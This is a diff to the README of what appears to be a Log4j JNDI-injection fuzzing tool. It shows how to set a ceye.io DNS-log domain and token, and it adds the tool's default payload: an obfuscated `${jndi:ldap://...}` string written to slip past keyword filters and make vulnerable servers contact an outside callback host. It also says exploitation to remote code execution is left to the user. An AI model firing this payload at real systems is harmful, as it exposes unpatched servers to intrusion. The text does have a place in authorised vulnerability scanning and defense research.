@@ -7,6 +7,10 @@ Manually edit line 372 in logmap.py to modify:
 to   
 `args.ceye = ["1234567.ceye.io", "843fd6d58a8ebede756a2b991d321a5a"]`  
 
+The default payload is `${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DNS_LOG_DOMAIN/a}` You can customize at will, in line 282  
+
+This is just a jndi injection fuzz tool, rce or others need yourself
+
 # Use  
 ```bash
 zhzy@debian:~/$ pip3 install -r requirements.txt
